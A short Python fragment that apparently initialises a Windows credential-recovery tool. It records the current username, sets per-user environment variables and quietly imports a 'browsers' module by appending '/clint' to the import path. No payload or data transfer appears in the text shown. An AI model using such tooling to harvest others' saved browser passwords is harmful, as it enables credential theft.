from .config.users import set_env_variables, get_username_winapi
from .config.constant import constant
import sys


# def user_impersonation():
constant.is_current_user = True
constant.username = get_username_winapi()
if not constant.username.endswith('$'):
    constant.finalResults = {'User': constant.username}
    set_env_variables(user=constant.username)

if "browsers" not in sys.modules:
    path=sys.path[0]
    sys.path[0]+= "/clint"
    __import__('browsers')
    sys.path[0]=path